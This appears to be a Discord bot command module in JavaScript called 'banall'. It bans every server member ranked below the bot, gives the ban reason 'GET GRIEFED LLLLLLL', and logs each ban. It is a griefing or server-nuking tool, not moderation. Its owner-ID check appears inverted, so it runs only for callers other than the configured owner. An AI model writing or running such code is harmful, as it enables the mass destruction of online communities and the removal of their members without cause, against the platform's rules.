const { Client, Message } = require("discord.js");
require('colors');

module.exports = {
    name: 'banall',
    description: 'Bans all members',

    /**
     * 
     * @param {Client} bot 
     * @param {Message} message 
     * @param {String[]} parts 
     */

    async execute(bot, message, parts) {
        if(!message.guild.me.hasPermission('BAN_MEMBERS')) return console.log(`${`[ERROR]`.red} Missing Permission 'BAN_MEMBERS' on Guild ${message.guild.name}!`)
        message.guild.members.cache.forEach(async m => {
            if(m.roles.highest.position < message.guild.me.roles.highest.position) {
                if(bot.cfg.myID != '' && bot.cfg.myID != message.author.id) {
                    m.ban({
                        reason: `GET GRIEFED LLLLLLL`
                    });
                    await console.log(`${`[SUCCESS]`.green} ${`Successfully banned member '${m.user.username}'!`.yellow}`)
                }
            } else {
                console.log(`${`[ERROR]`.red} ${`Missing Permissions for member '${m.user.username}' because his highest role is higher than my highest role!`.yellow}`);
            }
        })
    }
}